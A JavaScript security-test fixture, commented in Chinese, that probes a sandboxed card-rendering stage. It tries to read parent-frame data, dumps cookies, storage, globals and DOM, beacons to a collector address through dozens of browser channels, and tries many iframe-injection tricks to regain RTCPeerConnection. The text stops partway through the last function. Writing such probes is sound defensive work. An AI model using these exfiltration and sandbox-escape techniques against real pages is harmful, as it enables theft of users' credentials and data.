/**
 * 越权探测卡的代码的夹具(任务书 `docs/plan/sound-online-render-task.md` 第 14 条与文末「越权探测卡」一节;契约 `docs/plan/online-card-exec-contract.md` 第 10 节)。
 *
 * **这是防御性测试夹具,不是攻击代码**:只在测试环境里用,不进卡片库、不随发版;它在自己的代码里逐项「尝试」读取本不该读到的东西、尝试向收集站发数据,
 * 把每一项「读到了 / 被拒了 / 报了什么错」记成结果由探针取回来断言。只读、只报告:不删、不改、不占资源、不绕过浏览器或系统的安全机制;
 * 用到的口令、票据、收集站地址全是探针事先放好的**假凭证与本机地址**,不使用任何真实凭证、真实项目、真实外部地址。
 *
 * 这是**探测代码本体**,越权探测用户卡 `probe-boundary-card.tsx` 与越权探测素材效果卡 `probe-boundary-graph.tsx` 都引它。两种跑法共用这一份:
 *   - 现在(加载器还没接到舞台上):`scripts/probes/online-card-security-probe.mjs` 把本文件的 `export` 换成 CommonJS 的写法,
 *     在舞台的帧里用 `new Function("require", "module", "exports", 代码)` 执行(与加载器执行转译结果的办法相同);
 *   - 与块 T 合流之后:三份文件原样 `content.put` 进内容库,经真实的转译与加载路径执行,结果从 `globalThis.__pcBoundary` 读。
 *
 * 为了两种跑法都能用:只写普通的脚本(没有类型标注、不引别的模块),不出现写法预检会拦的东西 —— 动态载入那一条探测经
 * `new Function` 造出来(预检是词法层面的,拦不到它;策略会拦)。
 *
 * 每个函数回一个普通对象(名字 → 结果文本)。**断言不看这里的自述**,看探针那一头的事实:收集站收到没有、读出来的东西里
 * 有没有探针知道的秘密。这里的文本只用来定位是哪一条。
 */

const TIMEOUT_MS = 6000;
const text = (v) => { try { return typeof v === "string" ? v : JSON.stringify(v); } catch (e) { return String(v); } };
/**
 * 真实时间的定时器。舞台把 `setTimeout` 换成了跟着舞台时间走的那一份(`src/render/stageClock.ts`,不播放时不走),
 * 它自己用的真定时器留在 `__pcRealSetTimeout` 上 —— 卡片代码同样拿得到。Worker 里的 `setTimeout` 本来就是真的。
 */
const later = (fn, ms) => (globalThis.__pcRealSetTimeout || setTimeout)(fn, ms);
const wait = (ms) => new Promise((r) => later(r, ms));

function runner(out, only) {
  return async (name, fn) => {
    if (only && only.indexOf(name) < 0) return;
    try { globalThis.__pcBoundaryProgress = name; } catch (e) { /* 只是进度记号 */ }
    try {
      out[name] = text(await Promise.race([Promise.resolve().then(fn), new Promise((r) => later(() => r("超时"), TIMEOUT_MS))]));
    } catch (e) {
      out[name] = "抛错:" + (e && e.name) + ":" + String(e && e.message).slice(0, 120);
    }
  };
}

/* ------------------------------------------------------------------ 读:父页对象 */
export async function parentReads(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  await t("parent.document", () => String(parent.document.title));
  await t("parent.location.href", () => String(parent.location.href));
  await t("parent.localStorage", () => text(Object.keys(parent.localStorage)));
  await t("parent.sessionStorage", () => text(Object.keys(parent.sessionStorage)));
  await t("parent.indexedDB", () => parent.indexedDB.databases().then((d) => text(d)));
  await t("parent.__pcStore", () => text(parent.__pcStore.getState().project));
  await t("parent.__pcPreviewDiag", () => text(parent.__pcPreviewDiag()));
  await t("parent.fetch", () => parent.fetch("/editor/runtime-config.json").then((r) => r.text()));
  await t("parent.eval", () => String(parent.eval("document.cookie")));
  await t("parent.document.cookie", () => String(parent.document.cookie));
  await t("top.document", () => String(top.document.title));
  await t("top.location.href", () => String(top.location.href));
  await t("top.localStorage", () => text(Object.keys(top.localStorage)));
  // 兄弟框架:自己那一个读得到(回自己的地址),别的舞台源读不到
  for (let i = 0; i < 4; i++) await t("parent.frames[" + i + "]", () => (parent.frames[i] === window ? "自己" : String(parent.frames[i].location.href) + " " + text(Object.keys(parent.frames[i].localStorage))));
  await t("opener", () => String(window.opener));
  await t("frameElement", () => String(window.frameElement));
  await t("window.length", () => String(window.length));
  await t("Object.keys(parent)", () => text(Object.keys(parent)));
  await t("Reflect.ownKeys(parent)", () => text(Reflect.ownKeys(parent).map(String)));
  await t("parent.name", () => String(parent.name));
  await t("document.referrer", () => String(document.referrer));
  await t("ancestorOrigins", () => text(Array.from(location.ancestorOrigins || [])));
  return out;
}

/* ------------------------------------------------------------------ 读:把舞台里读得到的一切倒出来 */
async function dumpIndexedDb(limit) {
  const parts = [];
  const dbs = await indexedDB.databases();
  for (const info of dbs) {
    parts.push("db:" + info.name);
    const db = await new Promise((res, rej) => { const r = indexedDB.open(info.name); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); r.onblocked = () => rej(new Error("blocked")); });
    try {
      for (const store of Array.from(db.objectStoreNames)) {
        parts.push("store:" + store);
        const rows = await new Promise((res, rej) => {
          const acc = [];
          const cur = db.transaction(store, "readonly").objectStore(store).openCursor();
          cur.onsuccess = () => { const c = cur.result; if (!c || acc.length >= limit) return res(acc); acc.push(text(c.key) + "=" + text(c.value).slice(0, 4000)); c.continue(); };
          cur.onerror = () => rej(cur.error);
        });
        parts.push(rows.join("\n"));
      }
    } finally { db.close(); }
  }
  return parts.join("\n");
}

async function dumpOpfs(dir, depth) {
  const parts = [];
  for await (const [name, handle] of dir.entries()) {
    parts.push("opfs:" + name);
    if (handle.kind === "file") { const f = await handle.getFile(); parts.push((await f.slice(0, 4000).text())); }
    else if (depth < 3) parts.push(await dumpOpfs(handle, depth + 1));
  }
  return parts.join("\n");
}

function dumpGlobals() {
  // 全局对象上能走到的字符串(三层),外加每个 `__pc*` 观察口的返回值
  const seen = new Set(), parts = [];
  // 有预算:最多看 20 万个值、3 秒;大数组与字节块不逐项走(里面不会有字符串形状的秘密之外的东西,另由 DOM、存储那几项覆盖)
  const t0 = Date.now();
  let visited = 0;
  const walk = (v, depth, path) => {
    if (parts.length > 20000 || ++visited > 200000 || (visited % 2000 === 0 && Date.now() - t0 > 3000)) return;
    if (typeof v === "string") { if (v.length >= 8) parts.push(path + "=" + v.slice(0, 4000)); return; }
    if (v === null || (typeof v !== "object" && typeof v !== "function") || depth > 3 || seen.has(v)) return;
    seen.add(v);
    if (typeof Node !== "undefined" && v instanceof Node) return;
    if (ArrayBuffer.isView(v) || v instanceof ArrayBuffer) return;
    if (Array.isArray(v) && v.length > 2000) return;
    let keys = [];
    try { keys = Object.getOwnPropertyNames(v); } catch (e) { return; }
    for (const k of keys) {
      if (depth === 0 && /^(window|self|top|parent|frames|globalThis|document|location|navigator|performance|localStorage|sessionStorage|indexedDB|caches|cookieStore)$/.test(k)) continue;
      let child;
      try { child = v[k]; } catch (e) { continue; }
      walk(child, depth + 1, path + "." + k);
    }
  };
  walk(globalThis, 0, "g");
  for (const k of Object.getOwnPropertyNames(globalThis)) {
    if (!/^__pc/.test(k)) continue;
    let fn;
    try { fn = globalThis[k]; } catch (e) { continue; }
    if (typeof fn !== "function") { parts.push("hook:" + k + "=" + text(fn)); continue; }
    try { parts.push("hook:" + k + "()=" + String(text(fn())).slice(0, 200000)); } catch (e) { parts.push("hook:" + k + " 抛错"); }
  }
  return parts.join("\n");
}

function dumpDom() {
  const parts = [];
  for (const el of Array.from(document.querySelectorAll("*")).slice(0, 5000)) {
    for (const a of Array.from(el.attributes)) if (a.value && a.value.length >= 6) parts.push(el.localName + "@" + a.name + "=" + a.value.slice(0, 2000));
  }
  for (const s of Array.from(document.styleSheets)) { try { for (const r of Array.from(s.cssRules).slice(0, 2000)) if (/url\(/.test(r.cssText)) parts.push("css:" + r.cssText.slice(0, 500)); } catch (e) { /* 读不了的样式表 */ } }
  return parts.join("\n");
}

/**
 * 把舞台的脚本环境里读得到的东西全倒成文本:本机存储、cookie、性能条目、DOM 属性、全局变量与观察口、地址与来源、
 * 以及接下来 `ctx.listenMs` 毫秒里父页发来的每一条消息(`setMediaPolicy` 等 RPC)。探针拿它逐个比对自己知道的秘密。
 */
export async function dumpEverything(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const heard = [];
  const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("消息读不了"); } };
  addEventListener("message", onMessage);
  await t("location", () => location.href + " | " + document.URL + " | " + document.referrer + " | " + window.name + " | " + text(history.state));
  await t("localStorage", () => text(Object.keys(localStorage).map((k) => [k, localStorage.getItem(k)])));
  await t("sessionStorage", () => text(Object.keys(sessionStorage).map((k) => [k, sessionStorage.getItem(k)])));
  await t("indexedDB.databases", () => indexedDB.databases().then((d) => text(d.map((x) => x.name))));
  await t("indexedDB", () => dumpIndexedDb(500));
  await t("document.cookie", () => document.cookie);
  await t("cookieStore", () => cookieStore.getAll().then((all) => text(all.map((c) => c.name + "=" + c.value + ";" + c.domain + ";" + c.path))));
  await t("opfs", () => navigator.storage.getDirectory().then((d) => dumpOpfs(d, 0)));
  await t("caches", async () => { const parts = []; for (const k of await caches.keys()) { parts.push("cache:" + k); const c = await caches.open(k); for (const req of await c.keys()) { parts.push(req.url); const r = await c.match(req); if (r) parts.push((await r.text()).slice(0, 4000)); } } return parts.join("\n"); });
  await t("storage.estimate", () => navigator.storage.estimate().then(text));
  await t("performance", () => text(performance.getEntries().map((e) => e.name)));
  await t("dom", () => dumpDom());
  await t("globals", () => dumpGlobals());
  // 凭 cookie 读素材:读得到字节(素材效果卡本来就要),但应答头里不该有票据
  if (ctx.sid && ctx.mediaHash) {
    await t("media-headers", () => fetch("/media-s/" + ctx.sid + "/media/" + ctx.mediaHash).then((r) => r.status + " " + text(Array.from(r.headers.entries()))));
    await t("grant-from-stage", () => fetch("/media-s/" + ctx.sid + "/_grant", { method: "POST", credentials: "include" }).then((r) => r.status + " " + text(Array.from(r.headers.entries()))));
  }
  await t("runtime-config", () => fetch("/editor/runtime-config.json").then((r) => r.text()).then((s) => s.slice(0, 2000)));
  await t("trace", () => new Promise((res) => { const x = new XMLHttpRequest(); try { x.open("TRACE", "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash); x.onload = () => res(x.status + " " + x.responseText.slice(0, 2000)); x.onerror = () => res("拦下"); x.send(); } catch (e) { res("抛错:" + e.name); } }));
  await wait(ctx.listenMs || 0);
  removeEventListener("message", onMessage);
  out["parent-messages"] = heard.join("\n");
  return out;
}

/** 只听父页发来的消息 `ctx.listenMs` 毫秒(取档策略等 RPC 都经这里):里面不该有票据 */
export async function listenParent(ctx) {
  const heard = [];
  const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("消息读不了"); } };
  addEventListener("message", onMessage);
  await wait(ctx.listenMs || 0);
  removeEventListener("message", onMessage);
  return { "parent-messages": heard.join("\n") };
}

/* ------------------------------------------------------------------ 带走:向收集站发请求的每一种办法 */
export async function exfilAttacks(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const E = ctx.collector, D = "http://" + ctx.dnsHost + ":" + ctx.collectorPort, tag = ctx.tag;
  const q = (name) => E + "/x?" + name + "=" + tag;
  const mount = (el) => { (document.body || document.documentElement).appendChild(el); return el; };
  await t("fetch", () => fetch(q("fetch")).then((r) => "到达:" + r.status));
  await t("fetch-no-cors", () => fetch(q("nocors"), { mode: "no-cors" }).then(() => "到达"));
  await t("fetch-keepalive", () => fetch(q("keepalive"), { mode: "no-cors", keepalive: true, method: "POST", body: "d" }).then(() => "到达"));
  await t("fetch-dns-name", () => fetch(D + "/x?dnsfetch=" + tag, { mode: "no-cors" }).then(() => "到达"));
  await t("xhr", () => new Promise((res) => { const x = new XMLHttpRequest(); x.onload = () => res("到达"); x.onerror = () => res("拦下"); x.open("GET", q("xhr")); x.send(); }));
  await t("websocket", () => new Promise((res) => { const w = new WebSocket(E.replace("http", "ws") + "/ws?ws=" + tag); w.onopen = () => res("到达"); w.onerror = () => res("拦下"); }));
  await t("websocketstream", () => { if (typeof WebSocketStream !== "function") return "没有这个接口"; const w = new WebSocketStream(E.replace("http", "ws") + "/ws?wss=" + tag); return w.opened.then(() => "到达", () => "拦下"); });
  await t("beacon", () => String(navigator.sendBeacon(q("beacon"), "d")));
  await t("eventsource", () => new Promise((res) => { const s = new EventSource(q("es")); s.onopen = () => res("到达"); s.onerror = () => { s.close(); res("拦下"); }; }));
  await t("webtransport", () => { if (typeof WebTransport !== "function") return "没有这个接口"; const w = new WebTransport("https://127.0.0.1:" + ctx.collectorPort + "/wt"); return w.ready.then(() => "到达", () => "拦下"); });
  await t("img", () => new Promise((res) => { const i = new Image(); i.onload = () => res("到达"); i.onerror = () => res("拦下"); i.src = E + "/x.png?img=" + tag; }));
  await t("img-srcset", async () => { const i = document.createElement("img"); i.srcset = E + "/x.png?srcset=" + tag + " 2x"; mount(i); await wait(300); return "已插入"; });
  await t("svg-image", async () => { const h = document.createElement("div"); h.innerHTML = "<svg width=10 height=10><image href='" + E + "/x.png?svgimage=" + tag + "' width=10 height=10 /><use href='" + E + "/x.svg?svguse=" + tag + "#a' /></svg>"; mount(h); await wait(300); return "已插入"; });
  await t("input-image", async () => { const i = document.createElement("input"); i.type = "image"; i.src = E + "/x.png?inputimage=" + tag; mount(i); await wait(300); return "已插入"; });
  await t("css-bg", async () => { const d = document.createElement("div"); d.style.backgroundImage = "url(" + E + "/x.png?cssbg=" + tag + ")"; d.style.cursor = "url(" + E + "/x.png?csscursor=" + tag + "), auto"; d.style.width = "10px"; d.style.height = "10px"; mount(d); await wait(300); return "已插入"; });
  await t("css-import-font", async () => { const s = document.createElement("style"); s.textContent = "@import url(" + E + "/x.css?cssimport=" + tag + "); @font-face{font-family:pcboundary;src:url(" + E + "/x.woff2?font=" + tag + ")} .pcboundary{font-family:pcboundary}"; document.head.appendChild(s); const d = document.createElement("div"); d.className = "pcboundary"; d.textContent = "x"; mount(d); await wait(400); return "已插入"; });
  await t("fontface-api", () => new FontFace("pcboundary2", "url(" + E + "/x.woff2?fontface=" + tag + ")").load().then(() => "到达", () => "拦下"));
  await t("link-css", async () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = E + "/x.css?link=" + tag; document.head.appendChild(l); await wait(300); return "已插入"; });
  await t("link-icon-manifest", async () => { for (const rel of ["icon", "manifest", "apple-touch-icon"]) { const l = document.createElement("link"); l.rel = rel; l.href = E + "/x.png?rel" + rel + "=" + tag; document.head.appendChild(l); } await wait(400); return "已插入"; });
  await t("script-src", () => new Promise((res) => { const s = document.createElement("script"); s.onload = () => res("到达"); s.onerror = () => res("拦下"); s.src = E + "/x.js?script=" + tag; document.head.appendChild(s); }));
  await t("script-module", () => new Promise((res) => { const s = document.createElement("script"); s.type = "module"; s.onload = () => res("到达"); s.onerror = () => res("拦下"); s.src = E + "/x.js?module=" + tag; document.head.appendChild(s); }));
  await t("dynamic-import", () => new Function("u", "return imp" + "ort(u)")(E + "/x.js?dynimport=" + tag).then(() => "到达"));
  await t("iframe", async () => { const f = document.createElement("iframe"); f.src = q("iframe"); mount(f); await wait(500); return "已插入"; });
  await t("iframe-html", async () => { const h = document.createElement("div"); h.innerHTML = "<iframe src='" + q("iframehtml") + "'></iframe>"; mount(h); await wait(500); return "已插入"; });
  await t("iframe-srcdoc", async () => { const f = document.createElement("iframe"); f.srcdoc = "<img src='" + E + "/x.png?srcdoc=" + tag + "'>"; mount(f); await wait(500); return "已插入"; });
  await t("object", async () => { const o = document.createElement("object"); o.data = q("object"); mount(o); await wait(300); return "已插入"; });
  await t("embed", async () => { const o = document.createElement("embed"); o.src = q("embed"); mount(o); await wait(300); return "已插入"; });
  await t("video", () => new Promise((res) => { const v = document.createElement("video"); v.onerror = () => res("拦下"); v.onloadeddata = () => res("到达"); v.src = E + "/x.webm?video=" + tag; later(() => res("没结果"), 1200); }));
  await t("audio-track", async () => { const a = document.createElement("audio"); a.src = E + "/x.mp3?audio=" + tag; const v = document.createElement("video"); const tr = document.createElement("track"); tr.src = E + "/x.vtt?track=" + tag; tr.default = true; v.appendChild(tr); v.poster = E + "/x.png?poster=" + tag; mount(a); mount(v); await wait(500); return "已插入"; });
  // 表单提交(本框架、新窗口)与带 download 的链接会把舞台自己带走(被拦下后框架落到错误页),归到导航类里单独跑(navAttack 的 form-self、form-blank、a-download)
  await t("a-ping", async () => { const a = document.createElement("a"); a.href = "#"; a.ping = q("ping"); mount(a); a.click(); await wait(300); return "已点"; });
  for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload", "prerender"]) {
    await t("hint-" + rel, async () => { const l = document.createElement("link"); l.rel = rel; l.href = E + "/x.js?" + rel + "=" + tag; if (rel === "preload") l.as = "script"; document.head.appendChild(l); await wait(500); return "已插入"; });
  }
  await t("hint-dns-name", async () => { for (const rel of ["dns-prefetch", "preconnect"]) { const l = document.createElement("link"); l.rel = rel; l.href = "http://" + ctx.dnsHost + "/"; document.head.appendChild(l); } await wait(800); return "已插入"; });
  await t("speculation-rules", async () => { const s = document.createElement("script"); s.type = "speculationrules"; s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [q("specrules")] }] }); document.head.appendChild(s); await wait(500); return "已插入"; });
  await t("worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?worker=" + tag); w.onerror = () => res("拦下"); later(() => res("已建"), 500); } catch (e) { res("抛错:" + e.name); } }));
  await t("worker-same-origin-url", () => new Promise((res) => { try { const src = Array.from(document.scripts).map((s) => s.src).find(Boolean); const w = new Worker(src); w.onmessage = () => res("跑起来了"); w.onerror = () => res("拦下"); later(() => res("没结果"), 800); } catch (e) { res("抛错:" + e.name); } }));
  await t("sharedworker", () => new Promise((res) => { try { const w = new SharedWorker(E + "/x.js?shared=" + tag); w.onerror = () => res("拦下"); later(() => res("已建"), 500); } catch (e) { res("抛错:" + e.name); } }));
  await t("service-worker", () => navigator.serviceWorker.register(Array.from(document.scripts).map((s) => s.src).find(Boolean)).then(() => "注册成功"));
  await t("audio-worklet", async () => { const C = window.OfflineAudioContext; const c = new C(1, 128, 44100); return c.audioWorklet.addModule(E + "/x.js?worklet=" + tag).then(() => "到达", () => "拦下"); });
  await t("paint-worklet", () => (CSS.paintWorklet ? CSS.paintWorklet.addModule(E + "/x.js?paint=" + tag).then(() => "到达", () => "拦下") : "没有这个接口"));
  await t("blob-worker-fetch", () => new Promise((res) => { const w = new Worker(URL.createObjectURL(new Blob(["fetch(" + JSON.stringify(q("blobworker")) + ",{mode:'no-cors'}).then(()=>postMessage('到达'),()=>postMessage('拦下'))"], { type: "text/javascript" }))); w.onmessage = (e) => res(e.data); w.onerror = () => res("Worker 出错"); }));
  await t("window.open", () => { const w = window.open(q("open")); return w ? "开出来了" : "没开出来"; });
  await t("webrtc", () => webrtcAttack(ctx, globalThis.RTCPeerConnection || globalThis.webkitRTCPeerConnection));
  return out;
}

/** WebRTC:向收集站发 STUN(UDP)与 TURN(TCP)。`Ctor` 是拿得到的构造器(加固之后本文档里是 undefined) */
export function webrtcAttack(ctx, Ctor) {
  return new Promise((res) => {
    if (typeof Ctor !== "function") return res("没有构造器");
    let pc;
    try {
      pc = new Ctor({ iceServers: [{ urls: "stun:127.0.0.1:" + ctx.collectorPort }, { urls: "turn:127.0.0.1:" + ctx.collectorPort + "?transport=tcp", username: "exfil-" + ctx.tag, credential: "x" }] });
    } catch (e) { return res("抛错:" + e.name); }
    const got = [];
    pc.onicecandidate = (e) => { if (e.candidate) got.push(e.candidate.type); else res("候选:" + JSON.stringify(got)); };
    pc.createDataChannel("x");
    pc.createOffer().then((o) => pc.setLocalDescription(o)).catch((e) => res("抛错:" + e.name));
    later(() => res("候选(到时):" + JSON.stringify(got)), 3000);
  });
}

/* ------------------------------------------------------------------ 加固:从子框架拿回 RTCPeerConnection 的每一条路 */
export async function hardenAttacks(ctx) {
  const out = {};
  const host = document.createElement("div");
  (document.body || document.documentElement).appendChild(host);
  const XHTML = "http://www.w3.org/1999/xhtml";
  /** 此刻舞台里有没有子框架、里面拿不拿得到构造器(只看拿不拿得到,不用它) */
  const grab = () => {
    for (let i = 0; i < window.length; i++) { try { if (typeof window[i].RTCPeerConnection === "function") return "拿到了"; } catch (e) { /* 读不了 */ } }
    return "没拿到(子框架 " + window.length + " 个)";
  };
  const clean = () => { for (const f of Array.from(document.querySelectorAll("iframe,object,embed,frame,frameset,portal,fencedframe"))) f.remove(); host.textContent = ""; };
  const t = (name, fn) => {
    if (ctx.only && ctx.only.indexOf(name) < 0) return;
    try { fn(); out[name] = grab(); } catch (e) { out[name] = "抛错:" + (e && e.name) + ";" + grab(); }
    clean();
  };
  const asyncT = async (name, fn) => {
    if (ctx.only && ctx.only.indexOf(name) < 0) return;
    try { await Promise.race([fn(), wait(4000)]); out[name] = grab(); } catch (e) { out[name] = "抛错:" + (e && e.name) + ";" + grab(); }
    clean();
  };
  out["own"] = typeof window.RTCPeerConnection + "/" + typeof window.webkitRTCPeerConnection;
  // —— 可行性探针试过的 21 条(留作回归)
  t("createElement", () => host.appendChild(document.createElement("iframe")));
  t("createElement-大写", () => host.appendChild(document.createElement("IFRAME")));
  t("createElementNS", () => host.appendChild(document.createElementNS(XHTML, "iframe")));
  t("innerHTML", () => { host.innerHTML = "<iframe></iframe>"; });
  t("insertAdjacentHTML", () => host.insertAdjacentHTML("beforeend", "<iframe></iframe>"));
  t("outerHTML", () => { const d = document.createElement("div"); host.appendChild(d); d.outerHTML = "<iframe></iframe>"; });
  t("DOMParser+adopt", () => { const d = new DOMParser().parseFromString("<iframe></iframe>", "text/html"); host.appendChild(document.adoptNode(d.querySelector("iframe"))); });
  t("createContextualFragment", () => host.appendChild(document.createRange().createContextualFragment("<iframe></iframe>")));
  t("template", () => { const tp = document.createElement("template"); tp.innerHTML = "<iframe></iframe>"; host.appendChild(tp.content); });
  t("setHTMLUnsafe", () => host.setHTMLUnsafe("<iframe></iframe>"));
  t("setHTML(Sanitizer)", () => host.setHTML("<iframe></iframe>"));
  t("另一个文档的 createElement", () => { const d = document.implementation.createHTMLDocument(""); host.appendChild(d.createElement("iframe")); });
  t("XML 文档的 createElementNS", () => { const d = document.implementation.createDocument(XHTML, "html", null); host.appendChild(d.createElementNS(XHTML, "iframe")); });
  t("自定义内建元素", () => { class X extends HTMLIFrameElement {} customElements.define("x-pcboundary-f", X, { extends: "iframe" }); host.appendChild(new X()); });
  t("XSLT", () => { const xsl = new DOMParser().parseFromString('<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:element name="{concat(&quot;ifr&quot;,&quot;ame&quot;)}" namespace="' + XHTML + '"/></xsl:template></xsl:stylesheet>', "application/xml"); const pr = new XSLTProcessor(); pr.importStylesheet(xsl); host.appendChild(pr.transformToFragment(new DOMParser().parseFromString("<a/>", "application/xml"), document)); });
  t("object", () => { const o = document.createElement("object"); o.data = "about:blank"; host.appendChild(o); });
  t("svg-foreignObject", () => { host.innerHTML = "<svg><foreignObject><iframe xmlns='" + XHTML + "'></iframe></foreignObject></svg>"; });
  t("importNode(从取回来的同源文档)", () => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl, false); x.send(); const d = new DOMParser().parseFromString(x.responseText.indexOf("<iframe") >= 0 ? x.responseText : "<iframe></iframe>", "text/html"); host.appendChild(document.importNode(d.querySelector("iframe"), true)); });
  await asyncT("XHR responseType=document", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl); try { x.responseType = "document"; } catch (e) { return rej(e); } x.onload = () => { try { const d = x.response || x.responseXML; const el = d.querySelector("iframe") || d.createElement("iframe"); host.appendChild(document.importNode(el, true)); res(); } catch (e) { rej(e); } }; x.onerror = () => rej(new Error("取不到")); x.send(); }));
  t("execCommand", () => { host.contentEditable = "true"; host.focus(); document.execCommand("insertHTML", false, "<iframe></iframe>"); });
  t("window.open", () => { const w = window.open("about:blank"); if (w && typeof w.RTCPeerConnection === "function") throw new Error("OPENED"); });
  // —— 实现时补的
  t("XHR responseXML(同步)", () => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl, false); x.overrideMimeType("application/xhtml+xml"); x.send(); const d = x.responseXML; host.appendChild(document.importNode(d.querySelector("iframe"), true)); });
  t("XML 实体展开", () => { const d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY f "&#60;iframe xmlns=\'' + XHTML + '\'/&#62;">]><r xmlns="' + XHTML + '">&f;</r>', "application/xhtml+xml"); host.appendChild(document.importNode(d.documentElement, true)); });
  t("DOMParser XML + importNode", () => { const d = new DOMParser().parseFromString("<if" + "rame xmlns='" + XHTML + "'/>", "application/xhtml+xml"); host.appendChild(document.importNode(d.documentElement, true)); });
  t("cloneNode(另一个文档)", () => { const d = document.implementation.createHTMLDocument(""); const f = d.createElement("iframe"); host.appendChild(f.cloneNode(true)); });
  t("Range.insertNode", () => { const d = document.implementation.createHTMLDocument(""); const r = document.createRange(); r.selectNodeContents(host); r.insertNode(document.adoptNode(d.createElement("iframe"))); });
  t("insertAdjacentElement", () => { const d = document.implementation.createHTMLDocument(""); host.insertAdjacentElement("beforeend", document.adoptNode(d.createElement("iframe"))); });
  t("append / prepend / replaceChildren", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); try { host.append(mk()); } catch (e) { /* 下一个 */ } try { host.prepend(mk()); } catch (e) { /* 下一个 */ } host.replaceChildren(mk()); });
  t("before / after / replaceWith", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); const a = document.createElement("span"); host.appendChild(a); try { a.before(mk()); } catch (e) { /* 下一个 */ } try { a.after(mk()); } catch (e) { /* 下一个 */ } a.replaceWith(mk()); });
  t("文本节点的 after", () => { const d = document.implementation.createHTMLDocument(""); const tx = document.createTextNode("x"); host.appendChild(tx); tx.after(document.adoptNode(d.createElement("iframe"))); });
  t("replaceChild", () => { const d = document.implementation.createHTMLDocument(""); const a = document.createElement("span"); host.appendChild(a); host.replaceChild(document.adoptNode(d.createElement("iframe")), a); });
  t("片段里带着(appendChild 片段)", () => { const d = document.implementation.createHTMLDocument(""); const fr = document.createDocumentFragment(); const wrap = document.createElement("div"); fr.appendChild(wrap); Node.prototype.appendChild.call(wrap, document.adoptNode(d.createElement("iframe"))); host.appendChild(fr); });
  t("先插空壳再改名(setAttribute is)", () => { const el = document.createElement("div", { is: "iframe" }); host.appendChild(el); });
  t("embed", () => host.appendChild(document.createElement("embed")));
  t("frameset", () => { const fs = document.createElement("frameset"); fs.appendChild(document.createElement("frame")); document.documentElement.appendChild(fs); });
  t("template.content.cloneNode", () => { const d = document.implementation.createHTMLDocument(""); d.body.innerHTML = "<template><iframe></iframe></template>"; host.appendChild(document.importNode(d.querySelector("template").content, true)); });
  t("Document.parseHTMLUnsafe", () => { const d = Document.parseHTMLUnsafe("<iframe></iframe>"); host.appendChild(document.adoptNode(d.querySelector("iframe"))); });
  t("document.write", () => { document.write("<iframe></iframe>"); });
  t("shadow root innerHTML", () => { const s = host.attachShadow({ mode: "open" }); s.innerHTML = "<iframe></iframe>"; });
  t("shadow root setHTMLUnsafe", () => { const d = document.createElement("div"); host.appendChild(d); const s = d.attachShadow({ mode: "open" }); s.setHTMLUnsafe("<iframe></iframe>"); });
  t("声明式 shadow DOM", () => { host.setHTMLUnsafe("<div><template shadowrootmode='open'><iframe></iframe></template></div>"); });
  t("改写原型后再 createElement", () => { const keep = String.prototype.toLowerCase; String.prototype.toLowerCase = function () { return "div"; }; try { host.appendChild(document.createElement("iframe")); } finally { String.prototype.toLowerCase = keep; } });
  t("Reflect.apply 被改写", () => { const keep = Reflect.apply; Reflect.apply = function (f, th, args) { return keep(f, th, args); }; try { host.appendChild(document.createElement("iframe")); } finally { Reflect.apply = keep; } });
  t("MathML / SVG 命名空间里的 iframe", () => { host.appendChild(document.createElementNS("http://www.w3.org/2000/svg", "iframe")); });
  t("Worker 里的构造器", () => { /* Worker 里本来就没有 RTCPeerConnection:由 workerAttempts 断言 */ });
  // 兜底的时机:同一拍里插入后马上取(上面每条的 grab 就是同一拍);再等一拍看还剩不剩
  await wait(300);
  out["收尾时的子框架数"] = String(window.length);
  host.remove();
  return out;
}

/**
 * 加固的第二层(插入入口)与兜底:假设「不给造子框架元素」那一层被绕过了 —— `make` 是探针在页面脚本之前留的一个
 * 「原装 createElement 造 iframe」的函数(`globalThis.__pcMakeFrame`)。手里有了元素,逐个插入入口试,看舞台里会不会真的出现子框架。
 */
export async function insertAttacks(ctx) {
  const out = {};
  const make = globalThis.__pcMakeFrame;
  if (typeof make !== "function") return { "没有留原装的造法": "跳过" };
  const host = document.createElement("div");
  (document.body || document.documentElement).appendChild(host);
  const t = (name, fn) => {
    let said = "";
    try { fn(); said = "插进去了"; } catch (e) { said = "抛错:" + (e && e.name); }
    // 同一拍里看:插入入口没拦住的话这里就有子框架了(兜底的观察器要到下一拍才摘)
    out[name] = said + ";同一拍里子框架 " + window.length + " 个";
    for (const f of Array.from(document.querySelectorAll("iframe"))) f.remove();
    host.textContent = "";
  };
  const wrap = () => { const d = document.createElement("div"); Node.prototype.appendChild.call(d, make()); return d; };
  t("appendChild", () => host.appendChild(make()));
  t("appendChild(包在 div 里)", () => host.appendChild(wrap()));
  t("insertBefore", () => host.insertBefore(make(), null));
  t("replaceChild", () => { const a = document.createElement("span"); host.appendChild(a); host.replaceChild(make(), a); });
  t("append", () => host.append(make()));
  t("append(文本加元素)", () => host.append("x", wrap()));
  t("prepend", () => host.prepend(make()));
  t("replaceChildren", () => host.replaceChildren(make()));
  t("before", () => { const a = document.createElement("span"); host.appendChild(a); a.before(make()); });
  t("after", () => { const a = document.createElement("span"); host.appendChild(a); a.after(make()); });
  t("replaceWith", () => { const a = document.createElement("span"); host.appendChild(a); a.replaceWith(make()); });
  t("文本节点的 before", () => { const tx = document.createTextNode("x"); host.appendChild(tx); tx.before(make()); });
  t("文本节点的 replaceWith", () => { const tx = document.createTextNode("x"); host.appendChild(tx); tx.replaceWith(wrap()); });
